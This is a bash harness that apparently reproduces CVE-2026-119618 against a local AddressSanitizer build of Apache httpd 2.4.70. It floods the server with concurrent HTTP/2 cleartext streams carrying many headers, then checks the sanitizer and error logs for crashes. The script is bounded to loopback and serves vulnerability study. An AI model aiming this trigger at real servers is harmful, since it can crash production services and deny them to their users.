#!/usr/bin/env bash
# Bounded concurrent h2c sweep for CVE-2026-119618 on the affected build.
# Hundreds of trigger-shaped streams, many headers, one connection per curl
# parallel group, with http2 trace4 enabled. Loopback only.
set -o pipefail
ROOT="$(cd "$(dirname "$0")" && pwd)"
V=2.4.70
PORT=7080
PREFIX="$ROOT/install-$V-asan"
CONF="$ROOT/run/httpd-$V-race.conf"
PIDF="$ROOT/run/httpd-$V-race.pid"

# Reuse the checked oracle config, then add race-specific directives.
{
  cat "$ROOT/run/httpd-$V.conf"
  printf '\nPidFile "%s"\n' "$PIDF"
  printf 'H2MaxSessionStreams 1000\n'
  printf 'LogLevel http2:trace4\n'
} > "$CONF"

rm -f "$ROOT"/logs/asan-$V-race.*
ASAN_OPTIONS="detect_leaks=0:halt_on_error=1:log_path=$ROOT/logs/asan-$V-race" \
UBSAN_OPTIONS="print_stacktrace=1" \
  "$PREFIX/bin/httpd" -f "$CONF" -DFOREGROUND \
  > "$ROOT/logs/httpd-$V-race-stdout.log" 2>&1 &
HPID=$!
cleanup() { kill "$HPID" 2>/dev/null; wait "$HPID" 2>/dev/null; }
trap cleanup EXIT
for i in $(seq 1 60); do
  curl -sS --max-time 1 -o /dev/null "http://127.0.0.1:$PORT/index.html" 2>/dev/null && break
  sleep 0.25
done

hdrs=(-H 'Content-Type: text/plain')
for i in $(seq 1 64); do hdrs+=(-H "X-Filler-$i: value-$i"); done
urls=()
for i in $(seq 1 200); do urls+=("http://127.0.0.1:$PORT/cgi-bin/oracle?q=$i"); done

echo "== 3 rounds x 200 h2c streams x 65 headers, affected $V =="
for round in 1 2 3; do
  echo "round $round"
  curl --http2-prior-knowledge --parallel --parallel-immediate --max-time 45 \
    -sS -o /dev/null "${hdrs[@]}" "${urls[@]}" > /dev/null 2>&1
  echo "  curl_rc=$?"
done
sleep 1
echo "== ASan/UBSan report files =="
ls -l "$ROOT"/logs/asan-$V-race.* 2>/dev/null || echo "(none)"
echo "== error-log crash markers =="
grep -Ei 'AddressSanitizer|runtime error|SEGV|abort|crash' \
  "$ROOT/logs/httpd-$V-error.log" 2>/dev/null | tail -20 || echo "(none)"
echo "== worker/crash child markers =="
grep -Ei 'child pid.*exit|segmentation|AH0.*(crash|abort)' \
  "$ROOT/logs/httpd-$V-error.log" 2>/dev/null | tail -20 || echo "(none)"
